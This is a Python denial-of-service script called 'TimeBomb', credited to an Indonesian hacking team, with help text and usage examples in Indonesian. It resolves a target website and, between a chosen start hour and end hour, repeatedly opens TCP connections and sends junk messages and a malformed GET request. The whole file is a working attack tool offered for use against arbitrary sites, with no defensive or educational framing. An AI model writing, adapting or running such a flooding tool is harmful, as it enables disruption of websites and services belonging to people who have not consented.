import socket
import time
import sys
import os
import random
import string
import optparse

def help():
    print("""
 [+] Dos/DDos: TimeBomb 
 [+] Created by: Mr.Cekuy
 [+] Team: ATTACKER DEAD KILLER
 [+] Youtube: https://youtube.com/channel/UCt9-cT9A6TkAcIuLRVZ9XeQ
 [+] GitHub:https://github.com/MrCekuy404/DOS-ADK
=================================
|Tools ini dilakukan secara otomatis tidak |secara manual
|Tools ini akan berhenti sendiri sesuai |perintah kalian
 =================================
 __  __       ____     _
|  \/  |_ __ / ___|___| | ___   _ _   _
| |\/| | '__| |   / _ \ |/ / | | | | | |
| |  | | | _| |__|  __/   <| |_| | |_| |
|_|  |_|_|(_)\____\___|_| \_\\__,_|\__, |
                                  |___/
=================================
Pakai: 
python3 ADK-TB.py -t (target) -p (port) -m (jam serangan dimulai) -s (jam serangan selesai) --message (pesan)
Fungsi:
-t = targer serangan website/ip
-p = port target website
-m = sesuaikan jam penyerangan nya
-s = waktu selesai penyerangan sesuikan jam direkomendasikan 1 jam
--message = Pesan yang akan dijadikan sebagai serangan default: random msg
=================================
contoh1 : ADK-TB.py -t https://example.com -p 80 -m 12 -s 13 --message Seraaangwebsiteetargettt
contoh2 : ADK-TB.py -t (example.com -p 25 -m 12 -s 13
Ngerti Kan. gak ngerti parah bener lu sama gw
OK SELAMAT MENGGUNAKAN!!!!
""")

if len(sys.argv) == 1:
    help()
    exit()

opt = optparse.OptionParser(add_help_option=False)

opt.add_option("-t", dest="host")
opt.add_option("-p", dest="port")
opt.add_option("-m", dest="mulai")
opt.add_option("-s", dest="selesai")
opt.add_option("--message", dest="msg")

opts, args = opt.parse_args()

host = opts.host
port = opts.port
mulai = opts.mulai
selesai = opts.selesai

if opts.msg is None:
    message = string.punctuation + string.digits + string.ascii_letters + string.ascii_lowercase + string.ascii_uppercase
    msg = "".join(random.sample(message, 10))

elif opts.msg is not None:
    msg = opts.msg

else:
    pass

host = str(host).replace("https://", "").replace("http://", "").replace("www.", "")

try:
    ip = socket.gethostbyname(host)

except socket.gaierror as e:
    print("Pastikan anda memasukan website yang benar!!")
    exit()


# Time Bomb

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while True:
    waktu = time.strftime("%H")


    if str(waktu) == str(mulai):
        try:
            print("-+"*10 + " Menyerang website :  " + str(host) + "+-"*10)

            sock.connect((str(ip), int(port)))
                        
            if port == 80:
                sock.send("GET / \nHTTP /1.1\n User-Agent: {}\n\r".format("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36").encode())
                        
            sock.send(str(msg).encode("utf-8"))
        
        except:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    
    elif str(waktu) == str(selesai):
        print("\nWaktu selesai, menutup serangan!!!")
        time.sleep(1.0)
        sock.close()
        break

exit
